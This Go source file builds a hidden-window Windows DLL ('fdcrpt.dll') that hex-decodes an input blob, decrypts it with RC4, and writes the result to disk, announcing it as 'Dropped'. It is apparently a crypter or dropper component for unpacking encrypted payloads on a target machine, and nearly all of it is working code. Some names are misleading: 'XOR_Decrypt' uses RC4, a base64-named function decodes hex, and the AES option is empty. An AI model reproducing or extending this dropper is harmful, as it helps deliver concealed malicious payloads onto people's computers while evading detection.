package main

/*
Compiled with: go build -buildmode=c-shared -ldflags=" -w -s -H=windowsgui" -o fdcrpt.dll
or: go build -buildmode=c-shared -o fdcrpt.dll
set CGO_ENABLED=1
set GOOS=windows
set GOARCH=amd64
*/

import "C"
import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	"os"
)

var (
	__DESCIPHERDATA []byte
)

//export AtDecryptInFile
func AtDecryptInFile(Ifile string) {
	if len(Ifile) < 1 {
		panic("[ - ] Please insert correct path!")
	}

	// Create the file with extension
	f, errFile := os.Create(Ifile)
	if errFile != nil {
		panic(fmt.Sprintf("[ - ] Error when tried Create the file: %s\n", Ifile))
	}
	defer f.Close()

	_, errwr := f.Write(__DESCIPHERDATA)

	if errwr != nil {
		panic(fmt.Sprintf("[ - ] Error when tried write in the file: %s\n", Ifile))
	}

	fmt.Printf("[ + ] Succefully, %s are really Dropped!\n", Ifile)
	__DESCIPHERDATA = make([]byte, 0)

}

//export __Decode_64_AndDecrypt
func __Decode_64_AndDecrypt(content string, Ckey string, Alght string) {

	cnt := []byte(content)

	// decode data an len, reverse to binary symbols
	desencode_data := make([]byte, hex.DecodedLen(len(cnt)))

	_, errDcd := hex.Decode(desencode_data, cnt)
	if errDcd != nil {
		panic("[ + ] Error while decoding Data!")
	}

	// Crear memoria compartida y enviar el control a C

	switch Alght {
	case "aes":
		break
	case "rc4":
		IDecryptData := XOR_Decrypt(desencode_data, []byte(Ckey))

		__DESCIPHERDATA = make([]byte, 0)
		__DESCIPHERDATA = append(__DESCIPHERDATA, IDecryptData...)
	default:
		break
	}

}

/*
Model of rc4:
		cipher, err := rc4.NewCipher([]byte(ife.CKey))
		if err != nil {
			panic("[ - ] Error in NewCypher rc4")
		}

		cipher_text := make([]byte, len(ife.content))

		cipher.XORKeyStream(cipher_text, ife.content)
		// Data...
*/

// Local Functions
func XOR_Decrypt(data, Ckey []byte) []byte {
	cipher, err := rc4.NewCipher(Ckey)
	if err != nil {
		panic("[ - ] Failed with the Key!")
	}

	decipher_text := make([]byte, len(data))

	cipher.XORKeyStream(decipher_text, data)

	return decipher_text
}

func main() {}

func init() {
	fmt.Println("fdcrpt.dll ENTRYPOINT! Happy dcrpting!")
}
